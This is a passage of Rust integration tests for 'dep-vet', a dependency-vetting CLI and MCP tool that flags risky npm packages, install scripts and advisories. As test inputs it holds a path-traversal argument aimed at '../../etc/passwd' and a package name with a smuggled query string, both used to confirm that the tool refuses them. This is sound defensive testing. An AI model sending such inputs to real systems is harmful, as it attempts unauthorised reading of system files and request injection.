        "not_a_tool",
        serde_json::json!({}),
    );
    assert_eq!(response["error"]["code"], -32602, "{response}");

    drop(stdin);
    let _ = child.wait();
}

#[test]
fn mcp_vet_command_reports_unchecked_installs() {
    let registry = registry_with(&[], None);
    let (mut child, mut stdin, mut reader) = mcp_session(&registry);
    mcp_initialize(&mut stdin, &mut reader);

    let response = mcp_call(
        &mut stdin,
        &mut reader,
        2,
        "vet_command",
        serde_json::json!({"command": "npm install"}),
    );
    assert_eq!(response["result"]["structuredContent"]["exit_code"], 3);
    assert!(
        response["result"]["content"][0]["text"]
            .as_str()
            .unwrap()
            .contains("not checked")
    );

    drop(stdin);
    let _ = child.wait();
}

#[test]
fn mcp_vet_lockfile_change_audits_added_packages() {
    use std::process::Command as Process;
    let directory = tempfile::tempdir().unwrap();
    let lock = directory.path().join("package-lock.json");
    std::fs::write(
        &lock,
        r#"{"lockfileVersion":3,"packages":{"":{"name":"app"}}}"#,
    )
    .unwrap();
    let git = |args: &[&str]| {
        let status = Process::new("git")
            .args(args)
            .current_dir(directory.path())
            .status()
            .unwrap();
        assert!(status.success(), "git {args:?}");
    };
    git(&["init", "-q"]);
    git(&["add", "."]);
    git(&[
        "-c",
        "user.email=test@example.test",
        "-c",
        "user.name=test",
        "commit",
        "-qm",
        "base",
    ]);
    std::fs::write(
        &lock,
        r#"{"lockfileVersion":3,"packages":{"":{"name":"app"},"node_modules/expresss":{"version":"1.0.0"}}}"#,
    )
    .unwrap();

    let package = PackageFixture::clean("expresss");
    let registry = registry_with(&[package], None);
    let (mut child, mut stdin, mut reader) = mcp_session_in(&registry, Some(directory.path()));
    mcp_initialize(&mut stdin, &mut reader);

    let response = mcp_call(
        &mut stdin,
        &mut reader,
        2,
        "vet_lockfile_change",
        serde_json::json!({"lockfile": "package-lock.json"}),
    );
    assert_eq!(response["result"]["isError"], false, "{response}");
    assert_eq!(
        response["result"]["structuredContent"]["exit_code"], 2,
        "{response}"
    );

    drop(stdin);
    let _ = child.wait();
}

#[test]
fn mcp_refuses_lockfiles_outside_the_working_directory() {
    let registry = registry_with(&[], None);
    let (mut child, mut stdin, mut reader) = mcp_session(&registry);
    mcp_initialize(&mut stdin, &mut reader);

    let response = mcp_call(
        &mut stdin,
        &mut reader,
        2,
        "vet_lockfile_change",
        serde_json::json!({"lockfile": "../../etc/passwd"}),
    );
    assert_eq!(response["error"]["code"], -32602, "{response}");

    drop(stdin);
    let _ = child.wait();
}

#[test]
fn mcp_print_config_is_ready_to_paste() {
    let output = Command::cargo_bin("dep-vet")
        .unwrap()
        .args(["mcp", "--print-config"])
        .assert()
        .code(0)
        .get_output()
        .stdout
        .clone();
    let output = String::from_utf8(output).unwrap();
    assert!(output.contains("\"mcpServers\""), "{output}");
    assert!(output.contains("\"dep-vet\""), "{output}");
    assert!(output.contains("claude mcp add dep-vet"), "{output}");
    assert!(output.contains(" mcp"), "{output}");
}

fn write_lockfile(directory: &tempfile::TempDir, body: &str) -> std::path::PathBuf {
    let path = directory.path().join("package-lock.json");
    std::fs::write(&path, body).unwrap();
    path
}

#[test]
fn tree_builds_nested_npm_edges_and_reports_json() {
    let directory = tempfile::tempdir().unwrap();
    let lock = write_lockfile(
        &directory,
        r#"{
          "lockfileVersion": 3,
          "packages": {
            "": {"dependencies": {"a": "^1"}, "devDependencies": {"d": "^1"}},
            "node_modules/a": {"version": "1.0.0", "dependencies": {"b": "^1"}},
            "node_modules/a/node_modules/b": {"version": "2.0.0"},
            "node_modules/b": {"version": "1.0.0"},
            "node_modules/d": {"version": "1.0.0", "dev": true}
          }
        }"#,
    );

    let output = Command::cargo_bin("dep-vet")
        .unwrap()
        .args(["tree", lock.to_str().unwrap(), "--json"])
        .assert()
        .code(0)
        .get_output()
        .stdout
        .clone();
    let value: serde_json::Value = serde_json::from_slice(&output).unwrap();
    let edges = value["edges"].as_array().unwrap();
    assert!(
        edges.iter().any(|edge| {
            edge["from"] == "node_modules/a"
                && edge["to"] == "node_modules/a/node_modules/b"
                && edge["kind"] == "normal"
        }),
        "{value}"
    );
    assert!(
        edges
            .iter()
            .any(|edge| edge["from"] == "" && edge["to"] == "node_modules/a"),
        "{value}"
    );
    assert!(
        edges
            .iter()
            .any(|edge| edge["kind"] == "dev" && edge["to"] == "node_modules/d"),
        "{value}"
    );
    let root_b = value["nodes"]
        .as_array()
        .unwrap()
        .iter()
        .find(|node| node["path"] == "node_modules/b")
        .unwrap();
    assert_eq!(root_b["version"], "1.0.0");
}

#[test]
fn tree_notes_optional_dependencies_that_are_absent() {
    let directory = tempfile::tempdir().unwrap();
    let lock = write_lockfile(
        &directory,
        r#"{
          "lockfileVersion": 3,
          "packages": {
            "": {"dependencies": {"a": "^1"}},
            "node_modules/a": {
              "version": "1.0.0",
              "optionalDependencies": {"native": "^1"}
            }
          }
        }"#,
    );

    let output = Command::cargo_bin("dep-vet")
        .unwrap()
        .args(["tree", lock.to_str().unwrap(), "--json"])
        .assert()
        .code(0)
        .get_output()
        .stdout
        .clone();
    let value: serde_json::Value = serde_json::from_slice(&output).unwrap();
    assert!(
        value["unresolved"]
            .as_array()
            .unwrap()
            .iter()
            .any(|item| item.as_str().unwrap().contains("native")),
        "{value}"
    );
}

#[test]
fn tree_prints_a_human_graph_without_network() {
    let directory = tempfile::tempdir().unwrap();
    let lock = write_lockfile(
        &directory,
        r#"{
          "lockfileVersion": 3,
          "packages": {
            "": {"dependencies": {"a": "^1"}},
            "node_modules/a": {"version": "1.0.0", "dependencies": {"b": "^1"}},
            "node_modules/b": {"version": "1.0.0"}
          }
        }"#,
    );

    Command::cargo_bin("dep-vet")
        .unwrap()
        .args(["tree", lock.to_str().unwrap()])
        .assert()
        .code(0)
        .stdout(predicate::str::contains("a@1.0.0"))
        .stdout(predicate::str::contains("b@1.0.0"));
}

#[test]
fn tree_refuses_a_lockfile_it_cannot_graph_yet() {
    let directory = tempfile::tempdir().unwrap();
    let lock = directory.path().join("Cargo.lock");
    std::fs::write(&lock, "version = 3\n").unwrap();

    Command::cargo_bin("dep-vet")
        .unwrap()
        .args(["tree", lock.to_str().unwrap()])
        .assert()
        .code(3);
}

fn sarif_registry() -> MockRegistry {
    let package = PackageFixture {
        scripts: r#"{"postinstall":"node setup.js"}"#,
        ..PackageFixture::clean("pkg-a")
    };
    let mut routes = HashMap::new();
    routes.insert(package.route(), (200, package.to_json()));
    MockRegistry::start(routes)
}

#[test]
fn audit_emits_sarif_for_github_code_scanning() {
    let repo = Repo::new();
    repo.write("package-lock.json", &lockfile_json(&[("pkg-a", "1.0.0")]));
    let registry = sarif_registry();

    let output = registry
        .command()
        .current_dir(repo.path())
        .args(["audit", "package-lock.json", "--format", "sarif"])
        .assert()
        .code(1)
        .get_output()
        .stdout
        .clone();
    let value: serde_json::Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(value["version"], "2.1.0");
    assert_eq!(value["runs"][0]["tool"]["driver"]["name"], "dep-vet");
    let results = value["runs"][0]["results"].as_array().unwrap();
    let install = results
        .iter()
        .find(|result| result["ruleId"] == "install-scripts")
        .expect("install script finding is a SARIF result");
    assert_eq!(install["level"], "warning");
    assert_eq!(
        install["locations"][0]["physicalLocation"]["artifactLocation"]["uri"],
        "package-lock.json"
    );
    assert_eq!(install["properties"]["package"], "pkg-a");
    assert_eq!(install["properties"]["version"], "1.0.0");
    assert_eq!(install["properties"]["confidence"], "high");
    let rules = value["runs"][0]["tool"]["driver"]["rules"]
        .as_array()
        .unwrap();
    assert!(
        rules.iter().any(|rule| rule["id"] == "install-scripts"),
        "{value}"
    );
}

#[test]
fn audit_writes_sarif_to_a_file_and_keeps_the_exit_code() {
    let repo = Repo::new();
    repo.write("package-lock.json", &lockfile_json(&[("pkg-a", "1.0.0")]));
    let registry = sarif_registry();

    registry
        .command()
        .current_dir(repo.path())
        .args([
            "audit",
            "package-lock.json",
            "--format",
            "sarif",
            "-o",
            "results.sarif",
        ])
        .assert()
        .code(1)
        .stdout(predicate::str::is_empty());
    let body = std::fs::read_to_string(repo.path().join("results.sarif")).unwrap();
    let value: serde_json::Value = serde_json::from_str(&body).unwrap();
    assert_eq!(value["version"], "2.1.0");
}

#[test]
fn json_and_sarif_formats_cannot_be_combined() {
    let repo = Repo::new();
    repo.write("package-lock.json", &lockfile_json(&[("pkg-a", "1.0.0")]));

    Command::cargo_bin("dep-vet")
        .unwrap()
        .current_dir(repo.path())
        .args(["audit", "package-lock.json", "--json", "--format", "sarif"])
        .assert()
        .code(3)
        .stderr(predicate::str::contains("cannot be used with"));
}

#[test]
fn audit_reports_the_path_that_reaches_a_transitive_package() {
    let directory = tempfile::tempdir().unwrap();
    std::fs::write(
        directory.path().join("package-lock.json"),
        r#"{
          "lockfileVersion": 3,
          "packages": {
            "": {"dependencies": {"pkg-a": "^1"}},
            "node_modules/pkg-a": {"version": "1.0.0", "dependencies": {"pkg-b": "^1"}},
            "node_modules/pkg-b": {"version": "1.0.0"}
          }
        }"#,
    )
    .unwrap();

    let a = PackageFixture::clean("pkg-a");
    let b = PackageFixture::clean("pkg-b");
    let mut routes = HashMap::new();
    routes.insert(a.route(), (200, a.to_json()));
    routes.insert(b.route(), (200, b.to_json()));
    let registry = MockRegistry::start(routes);

    let output = registry
        .command()
        .current_dir(directory.path())
        .args(["audit", "package-lock.json", "--json"])
        .assert()
        .code(0)
        .get_output()
        .stdout
        .clone();
    let value: serde_json::Value = serde_json::from_slice(&output).unwrap();
    let packages = value["packages"].as_array().unwrap();
    let a = packages
        .iter()
        .find(|package| package["name"] == "pkg-a")
        .unwrap();
    let b = packages
        .iter()
        .find(|package| package["name"] == "pkg-b")
        .unwrap();
    assert_eq!(a["dependency_paths"], serde_json::json!([["pkg-a@1.0.0"]]));
    assert_eq!(
        b["dependency_paths"],
        serde_json::json!([["pkg-a@1.0.0", "pkg-b@1.0.0"]])
    );
}

#[test]
fn clean_package_exits_zero() {
    let package = PackageFixture::clean("clean-pkg");
    let registry = registry_with(&[package], Some(500_000));

    registry
        .command()
        .args(["npm", "clean-pkg"])
        .assert()
        .success()
        .code(0)
        .stdout(predicate::str::contains("INFO (exit 0)"))
        .stdout(predicate::str::contains("no findings"))
        .stdout(predicate::str::contains("500,000/week"));
}

#[test]
fn fresh_package_with_install_scripts_exits_two() {
    let package = PackageFixture {
        created_days_ago: 1,
        published_days_ago: 1,
        scripts: r#"{"postinstall":"node setup.js"}"#,
        publisher: "mallory",
        maintainers: &["alice"],
        ..PackageFixture::clean("evil-pkg")
    };
    let registry = registry_with(&[package], None);

    registry
        .command()
        .args(["npm", "evil-pkg"])
        .assert()
        .code(2)
        .stdout(predicate::str::contains("HIGH (exit 2)"))
        .stdout(predicate::str::contains("runs code during npm install"))
        .stdout(predicate::str::contains("postinstall: node setup.js"))
        .stdout(predicate::str::contains(
            "published by a user who is not a maintainer",
        ));
}

#[test]
fn json_output_is_machine_readable() {
    let package = PackageFixture {
        scripts: r#"{"preinstall":"node before.js"}"#,
        ..PackageFixture::clean("json-pkg")
    };
    let registry = registry_with(&[package], Some(42));

    let output = registry
        .command()
        .args(["npm", "json-pkg", "--json"])
        .assert()
        .code(1)
        .get_output()
        .stdout
        .clone();
    let value: serde_json::Value = serde_json::from_slice(&output).unwrap();

    assert_eq!(value["name"], "json-pkg");
    assert_eq!(value["version"], "1.0.0");
    assert_eq!(value["verdict"], "warn");
    assert_eq!(value["exit_code"], 1);
    assert_eq!(value["weekly_downloads"], 42);
    assert_eq!(value["findings"][0]["id"], "install-scripts");
}

#[test]
fn exact_version_is_requested_and_used() {
    let package = PackageFixture::clean("versioned-pkg");
    let registry = registry_with(&[package], None);

    registry
        .command()
        .args(["npm", "versioned-pkg@1.0.0"])
        .assert()
        .success()
        .stdout(predicate::str::contains("versioned-pkg@1.0.0"));

    let requests = registry.requests();
    assert_eq!(requests.first().map(String::as_str), Some("/versioned-pkg"));
}

#[test]
fn scoped_names_are_encoded_as_one_path_segment() {
    let package = PackageFixture::clean("@scope/pkg");
    let registry = registry_with(&[package], None);

    registry
        .command()
        .args(["npm", "@scope/pkg"])
        .assert()
        .success()
        .stdout(predicate::str::contains("@scope/pkg@1.0.0"));

    let requests = registry.requests();
    assert_eq!(requests.first().map(String::as_str), Some("/@scope%2Fpkg"));
}

#[test]
fn unknown_package_is_a_tool_error_not_a_verdict() {
    let registry = registry_with(&[], None);

    registry
        .command()
        .args(["npm", "ghost-pkg"])
        .assert()
        .code(3)
        .stderr(predicate::str::contains("was not found on npm"))
        .stderr(predicate::str::contains("this is not a verdict"));
}

#[test]
fn unknown_version_is_a_tool_error_with_guidance() {
    let package = PackageFixture::clean("versioned-pkg");
    let registry = registry_with(&[package], None);

    registry
        .command()
        .args(["npm", "versioned-pkg@9.9.9"])
        .assert()
        .code(3)
        .stderr(predicate::str::contains(
            "exact version or dist-tag, not a range",
        ));
}

#[test]
fn malformed_registry_response_is_reported_clearly() {
    let mut routes = HashMap::new();
    routes.insert(
        "/broken-pkg".to_string(),
        (200, "{ this is not json".to_string()),
    );
    let registry = MockRegistry::start(routes);

    registry
        .command()
        .args(["npm", "broken-pkg"])
        .assert()
        .code(3)
        .stderr(predicate::str::contains("could not read"));
}

#[test]
fn registry_failure_with_500_is_a_tool_error() {
    let mut routes = HashMap::new();
    routes.insert("/flaky-pkg".to_string(), (500, "{}".to_string()));
    let registry = MockRegistry::start(routes);

    registry
        .command()
        .args(["npm", "flaky-pkg"])
        .assert()
        .code(3)
        .stderr(predicate::str::contains("HTTP 500"));
}

#[test]
fn download_count_failure_does_not_fail_the_check() {
    let package = PackageFixture::clean("no-stats-pkg");
    let registry = registry_with(&[package], None);

    registry
        .command()
        .args(["npm", "no-stats-pkg", "--json"])
        .assert()
        .success();

    let output = registry
        .command()
        .args(["npm", "no-stats-pkg", "--json"])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let value: serde_json::Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(value["weekly_downloads"], serde_json::Value::Null);
}

#[test]
fn invalid_spec_never_reaches_the_network() {
    let registry = registry_with(&[], None);

    registry
        .command()
        .args(["npm", "foo bar"])
        .assert()
        .code(3)
        .stderr(predicate::str::contains(
            "characters the registry does not allow",
        ));

    assert!(registry.requests().is_empty());
}

#[test]
fn no_color_wins_over_force_color() {
    let package = PackageFixture::clean("plain-pkg");
    let registry = registry_with(&[package], None);

    let output = registry
        .command()
        .env("FORCE_COLOR", "1")
        .args(["--no-color", "npm", "plain-pkg"])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();

    let text = String::from_utf8_lossy(&output);
    assert!(!text.contains('\u{1b}'), "output contained ANSI escapes");
}

#[test]
fn force_color_produces_ansi() {
    let package = PackageFixture::clean("painted-pkg");
    let registry = registry_with(&[package], None);

    let output = registry
        .command()
        .env("FORCE_COLOR", "1")
        .env_remove("NO_COLOR")
        .args(["npm", "painted-pkg"])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();

    let text = String::from_utf8_lossy(&output);
    assert!(text.contains('\u{1b}'), "expected ANSI escapes");
}

fn binary() -> Command {
    Command::cargo_bin("dep-vet").unwrap()
}

#[test]
fn unknown_subcommand_is_a_tool_error_not_a_verdict() {
    binary()
        .args(["sbt", "com.example:thing"])
        .assert()
        .code(3)
        .stderr(predicate::str::contains("usage error"))
        .stderr(predicate::str::contains("not a verdict"));
}

#[test]
fn missing_subcommand_is_a_tool_error() {
    binary()
        .assert()
        .code(3)
        .stderr(predicate::str::contains("usage error"));
}

#[test]
fn unknown_flag_is_a_tool_error() {
    binary()
        .args(["npm", "express", "--pretty"])
        .assert()
        .code(3)
        .stderr(predicate::str::contains("unexpected argument"));
}

#[test]
fn help_exits_zero() {
    binary()
        .arg("--help")
        .assert()
        .code(0)
        .stdout(predicate::str::contains("Usage: dep-vet"));
}

#[test]
fn version_exits_zero() {
    binary()
        .arg("--version")
        .assert()
        .code(0)
        .stdout(predicate::str::contains(env!("CARGO_PKG_VERSION")));
}

#[test]
fn help_shows_the_wordmark() {
    binary()
        .arg("--help")
        .assert()
        .code(0)
        .stdout(predicate::str::contains("THE DEPENDENCY TRUST PROTOCOL"))
        .stdout(predicate::str::contains("ZERO BLIND TRUST"));
}

#[test]
fn piped_output_has_no_wordmark() {
    let package = PackageFixture::clean("clean-pkg");
    let registry = registry_with(&[package], None);

    registry
        .command()
        .args(["npm", "clean-pkg"])
        .assert()
        .success()
        .stdout(predicate::str::contains("THE DEPENDENCY TRUST PROTOCOL").not())
        .stdout(predicate::str::contains("INFO"));
}

const HIGH_ADVISORY: &str = r#"{"results":[{"vulns":[{"id":"GHSA-test-0001"}]}]}"#;

const HIGH_ADVISORY_DETAIL: &str = r#"{
    "id": "GHSA-test-0001",
    "summary": "test advisory for dep-vet",
    "aliases": ["CVE-2026-0001"],
    "database_specific": { "severity": "HIGH" },
    "affected": [
        {
            "package": { "ecosystem": "npm", "name": "advised-pkg" },
            "ranges": [
                {
                    "type": "ECOSYSTEM",
                    "events": [ { "introduced": "0" }, { "fixed": "2.0.0" } ]
                }
            ]
        }
    ]
}"#;

#[test]
fn a_high_advisory_sets_the_verdict() {
    let package = PackageFixture::clean("advised-pkg");
    let registry = registry_and_osv(
        &[package],
        None,
        200,
        HIGH_ADVISORY,
        Some(("GHSA-test-0001", HIGH_ADVISORY_DETAIL)),
    );

    registry
        .command()
        .args(["npm", "advised-pkg"])
        .assert()
        .code(2)
        .stdout(predicate::str::contains("HIGH (exit 2)"))
        .stdout(predicate::str::contains(
            "GHSA-test-0001 affects this version",
        ))
        .stdout(predicate::str::contains("CVE-2026-0001"))
        .stdout(predicate::str::contains(
            "https://osv.dev/vulnerability/GHSA-test-0001",
        ));
}

#[test]
fn a_high_advisory_report_suggests_the_fixed_version() {
    let package = PackageFixture::clean("advised-pkg");
    let registry = registry_and_osv(
        &[package],
        None,
        200,
        HIGH_ADVISORY,
        Some(("GHSA-test-0001", HIGH_ADVISORY_DETAIL)),
    );

    registry
        .command()
        .args(["npm", "advised-pkg"])
        .assert()
        .code(2)
        .stdout(predicate::str::contains("fixed in 2.0.0"))
        .stdout(predicate::str::contains("GHSA-test-0001"))
        .stdout(predicate::str::contains("major jump, may break"));

    let output = registry
        .command()
        .args(["npm", "advised-pkg", "--json"])
        .assert()
        .code(2)
        .get_output()
        .stdout
        .clone();
    let value: serde_json::Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(value["upgrades"][0]["fixed"][0], "2.0.0");
}

#[test]
fn audit_block_suggests_fixes_and_keeps_the_exit_code() {
    let repo = Repo::new();
    repo.write(
        "package-lock.json",
        &lockfile_json(&[("advised-pkg", "1.0.0")]),
    );

    let registry = registry_and_osv(
        &[PackageFixture::clean("advised-pkg")],
        None,
        200,
        HIGH_ADVISORY,
        Some(("GHSA-test-0001", HIGH_ADVISORY_DETAIL)),
    );

    registry
        .command()
        .current_dir(repo.path())
        .args(["audit", "package-lock.json"])
        .assert()
        .code(2)
        .stdout(predicate::str::contains("what to do"))
        .stdout(predicate::str::contains("advised-pkg 1.0.0"))
        .stdout(predicate::str::contains("→ 2.0.0"))
        .stdout(predicate::str::contains("HIGH (exit 2)"));
}

#[test]
fn advisory_failure_is_reported_without_failing_the_run() {
    let package = PackageFixture::clean("offline-osv-pkg");
    let registry = registry_and_osv(&[package], None, 500, "{}", None);

    registry
        .command()
        .args(["npm", "offline-osv-pkg"])
        .assert()
        .code(0)
        .stdout(predicate::str::contains("advisory check unavailable"))
        .stdout(predicate::str::contains(
            "says nothing about known vulnerabilities",
        ));
}

#[test]
fn json_includes_advisories() {
    let package = PackageFixture::clean("advised-pkg");
    let registry = registry_and_osv(
        &[package],
        None,
        200,
        HIGH_ADVISORY,
        Some(("GHSA-test-0001", HIGH_ADVISORY_DETAIL)),
    );

    let output = registry
        .command()
        .args(["npm", "advised-pkg", "--json"])
        .assert()
        .code(2)
        .get_output()
        .stdout
        .clone();
    let value: serde_json::Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(value["advisories"][0]["id"], "GHSA-test-0001");
    assert_eq!(value["advisories"][0]["severity"], "high");
    assert_eq!(value["findings"][0]["id"], "advisory");
}

#[test]
fn repeated_runs_are_served_from_the_cache() {
    let package = PackageFixture::clean("cached-pkg");
    let registry = registry_with(&[package], Some(10));
    let cache_dir = tempfile::tempdir().unwrap();

    let run = || {
        registry
            .command()
            .env_remove("DEPVET_NO_CACHE")
            .env("DEPVET_CACHE_DIR", cache_dir.path())
            .args(["npm", "cached-pkg"])
            .assert()
            .success();
    };

    run();
    let after_first = registry.requests().len();
    assert!(
        after_first >= 3,
        "expected registry, downloads, and OSV calls"
    );

    run();
    assert_eq!(
        registry.requests().len(),
        after_first,
        "second run should hit the cache"
    );
}

#[test]
fn no_cache_flag_refetches_everything() {
    let package = PackageFixture::clean("uncached-pkg");
    let registry = registry_with(&[package], Some(10));
    let cache_dir = tempfile::tempdir().unwrap();

    let run = || {
        registry
            .command()
            .env("DEPVET_CACHE_DIR", cache_dir.path())
            .args(["npm", "uncached-pkg", "--no-cache"])
            .assert()
            .success();
    };

    run();
    let after_first = registry.requests().len();
    run();
    assert_eq!(
        registry.requests().len(),
        after_first * 2,
        "--no-cache should refetch"
    );
}

#[test]
fn unreadable_advisory_details_still_surface_the_advisory() {
    let package = PackageFixture::clean("mystery-pkg");
    let registry = registry_and_osv(&[package], None, 200, HIGH_ADVISORY, None);

    registry
        .command()
        .args(["npm", "mystery-pkg"])
        .assert()
        .code(1)
        .stdout(predicate::str::contains(
            "GHSA-test-0001 affects this version",
        ))
        .stdout(predicate::str::contains(
            "OSV did not return details for this advisory",
        ));
}

struct Repo {
    directory: tempfile::TempDir,
}

impl Repo {
    fn new() -> Self {
        let directory = tempfile::tempdir().unwrap();
        let repo = Self { directory };
        repo.git(&["init", "-q"]);
        repo.git(&["config", "user.email", "dep-vet@example.test"]);
        repo.git(&["config", "user.name", "dep-vet tests"]);
        repo
    }

    fn path(&self) -> &std::path::Path {
        self.directory.path()
    }

    fn git(&self, args: &[&str]) {
        let output = std::process::Command::new("git")
            .args(args)
            .current_dir(self.path())
            .output()
            .expect("git runs");
        assert!(
            output.status.success(),
            "git {args:?} failed: {}",
            String::from_utf8_lossy(&output.stderr)
        );
    }

    fn write(&self, name: &str, body: &str) {
        std::fs::write(self.path().join(name), body).unwrap();
    }

    fn commit(&self, message: &str) {
        self.git(&["add", "-A"]);
        self.git(&["commit", "-q", "-m", message]);
    }
}

fn lockfile_json(packages: &[(&str, &str)]) -> String {
    let mut entries = vec![r#""": { "name": "app", "version": "1.0.0" }"#.to_string()];
    entries.extend(
        packages.iter().map(|(name, version)| {
            format!(r#""node_modules/{name}": {{ "version": "{version}" }}"#)
        }),
    );
    format!(
        r#"{{
            "name": "app",
            "version": "1.0.0",
            "lockfileVersion": 3,
            "packages": {{ {} }}
        }}"#,
        entries.join(",")
    )
}

#[test]
fn lock_audits_only_new_dependencies() {
    let repo = Repo::new();
    repo.write("package-lock.json", &lockfile_json(&[("express", "5.1.0")]));
    repo.commit("base");

    let evil = PackageFixture {
        created_days_ago: 1,
        published_days_ago: 1,
        scripts: r#"{"postinstall":"node setup.js"}"#,
        ..PackageFixture::clean("evil-pkg")
    };
    repo.write(
        "package-lock.json",
        &lockfile_json(&[("express", "5.1.0"), ("evil-pkg", "1.0.0")]),
    );

    let registry = registry_with(&[evil], None);
    registry
        .command()
        .current_dir(repo.path())
        .args(["lock", "package-lock.json", "--base", "HEAD"])
        .assert()
        .code(2)
        .stdout(predicate::str::contains("1 new package"))
        .stdout(predicate::str::contains("evil-pkg@1.0.0"))
        .stdout(predicate::str::contains("HIGH (exit 2)"));

    let requests = registry.requests();
    assert!(
        requests.iter().any(|path| path.contains("evil-pkg")),
        "the new package should be fetched"
    );
    assert!(
        !requests.iter().any(|path| path.contains("express")),
        "unchanged packages must not be fetched"
    );
}

#[test]
fn lock_with_no_new_dependencies_makes_no_requests() {
    let repo = Repo::new();
    let body = lockfile_json(&[("express", "5.1.0")]);
    repo.write("package-lock.json", &body);
    repo.commit("base");

    let registry = registry_with(&[], None);
    registry
        .command()
        .current_dir(repo.path())
        .args(["lock", "package-lock.json", "--base", "HEAD"])
        .assert()
        .code(0)
        .stdout(predicate::str::contains("no new packages"))
        .stdout(predicate::str::contains("INFO (exit 0)"));

    assert!(registry.requests().is_empty());
}

#[test]
fn lock_json_lists_the_new_packages() {
    let repo = Repo::new();
    repo.write("package-lock.json", &lockfile_json(&[("express", "5.1.0")]));
    repo.commit("base");
    repo.write(
        "package-lock.json",
        &lockfile_json(&[("express", "5.1.0"), ("added-pkg", "2.0.0")]),
    );

    let package = PackageFixture {
        version: "2.0.0",
        ..PackageFixture::clean("added-pkg")
    };
    let registry = registry_with(&[package], Some(5));
    let output = registry
        .command()
        .current_dir(repo.path())
        .args(["lock", "package-lock.json", "--base", "HEAD", "--json"])
        .assert()
        .code(0)
        .get_output()
        .stdout
        .clone();

    let value: serde_json::Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(value["base"], "HEAD");
    assert_eq!(value["new_packages"][0]["name"], "added-pkg");
    assert_eq!(value["exit_code"], 0);
}

#[test]
fn lock_rejects_invalid_package_names_without_requesting_them() {
    let repo = Repo::new();
    repo.write("package-lock.json", &lockfile_json(&[("express", "5.1.0")]));
    repo.commit("base");
    repo.write(
        "package-lock.json",
        &lockfile_json(&[("express", "5.1.0"), ("evil?x=1", "1.0.0")]),
    );

    let registry = registry_with(&[], None);
    registry
        .command()
        .current_dir(repo.path())
        .args(["lock", "package-lock.json", "--base", "HEAD"])
        .assert()
        .code(3)
        .stdout(predicate::str::contains("evil?x=1@1.0.0"))
        .stdout(predicate::str::contains(
            "characters the registry does not allow",
        ));

    assert!(
        !registry.requests().iter().any(|path| path.contains("evil")),
        "an invalid name must not reach the registry: {:?}",
        registry.requests()
    );
}

#[test]
fn lock_rejects_version_one_lockfiles() {
    let directory = tempfile::tempdir().unwrap();
    std::fs::write(
        directory.path().join("package-lock.json"),
        r#"{ "lockfileVersion": 1, "dependencies": {} }"#,
    )
    .unwrap();

    binary()
        .current_dir(directory.path())
        .args(["lock", "package-lock.json"])
        .assert()
        .code(3)
        .stderr(predicate::str::contains(
            "lockfileVersion 1 is not supported",
        ));
}

#[test]
fn lock_reports_a_missing_base_revision() {
    let repo = Repo::new();
    repo.write("package-lock.json", &lockfile_json(&[("express", "5.1.0")]));
    repo.commit("base");

    let registry = registry_with(&[], None);
    registry
        .command()
        .current_dir(repo.path())
        .args(["lock", "package-lock.json", "--base", "no-such-ref"])
        .assert()
        .code(3)
        .stderr(predicate::str::contains("git failed"));
}

#[test]
fn lock_flags_an_unfetchable_package_as_incomplete() {
    let repo = Repo::new();
    repo.write("package-lock.json", &lockfile_json(&[("express", "5.1.0")]));
    repo.commit("base");
    repo.write(
        "package-lock.json",
        &lockfile_json(&[("express", "5.1.0"), ("ghost-pkg", "1.0.0")]),
    );

    let registry = registry_with(&[], None);
    registry
        .command()
        .current_dir(repo.path())
        .args(["lock", "package-lock.json", "--base", "HEAD"])
        .assert()
        .code(3)
        .stdout(predicate::str::contains("ghost-pkg@1.0.0"))
        .stdout(predicate::str::contains("incomplete"));
}

#[test]
fn advisory_cap_is_disclosed_and_bounded() {
    let package = PackageFixture::clean("many-advisories-pkg");
    let vulns: Vec<String> = (0..26)
        .map(|index| format!(r#"{{"id":"GHSA-cap-{index:02}"}}"#))
        .collect();
    let batch = format!(r#"{{"results":[{{"vulns":[{}]}}]}}"#, vulns.join(","));
    let registry = registry_and_osv(&[package], None, 200, &batch, None);

    registry
        .command()
        .args(["npm", "many-advisories-pkg"])
        .assert()
        .code(1)
        .stdout(predicate::str::contains("more advisories not shown"))
        .stdout(predicate::str::contains(
            "1 additional advisory was not fetched",
        ));

    let detail_requests = registry
        .requests()
        .iter()
        .filter(|path| path.starts_with("/v1/vulns/"))
        .count();
    assert_eq!(detail_requests, 25, "the cap must bound detail fetches");
}

#[test]
fn lock_audits_the_real_package_behind_an_alias() {
    let repo = Repo::new();
    repo.write("package-lock.json", &lockfile_json(&[("express", "5.1.0")]));
    repo.commit("base");

    repo.write(
        "package-lock.json",
        r#"{
            "name": "app",
            "version": "1.0.0",
            "lockfileVersion": 3,
            "packages": {
                "": { "name": "app", "version": "1.0.0" },
                "node_modules/express": { "version": "5.1.0" },
                "node_modules/my-lodash": { "name": "lodash", "version": "4.17.21" }
            }
        }"#,
    );

    let registry = registry_with(
        &[PackageFixture {
            version: "4.17.21",
            ..PackageFixture::clean("lodash")
        }],
        None,
    );
    registry
        .command()
        .current_dir(repo.path())
        .args(["lock", "package-lock.json", "--base", "HEAD"])
        .assert()
        .code(0)
        .stdout(predicate::str::contains("lodash@4.17.21"));

    assert!(
        registry.requests().iter().any(|path| path == "/lodash"),
        "the real package name must be fetched: {:?}",
        registry.requests()
    );
}

#[test]
fn advisory_details_are_parallel_but_keep_batch_order() {
    let package = PackageFixture::clean("multi-adv-pkg");
    let mut routes = HashMap::new();
    routes.insert(package.route(), (200, package.to_json()));
    routes.insert(
        "/v1/querybatch".to_string(),
        (
            200,
            r#"{"results":[{"vulns":[{"id":"GHSA-aaa"},{"id":"GHSA-bbb"},{"id":"GHSA-ccc"}]}]}"#
                .to_string(),
        ),
    );
    for id in ["GHSA-aaa", "GHSA-bbb", "GHSA-ccc"] {
        routes.insert(
            format!("/v1/vulns/{id}"),
            (
                200,
                format!(r#"{{"id":"{id}","summary":"summary for {id}"}}"#),
            ),
        );
    }
    let registry = MockRegistry::start(routes);

    let output = registry
        .command()
        .args(["npm", "multi-adv-pkg", "--json"])
        .assert()
        .code(1)
        .get_output()
        .stdout
        .clone();
    let value: serde_json::Value = serde_json::from_slice(&output).unwrap();
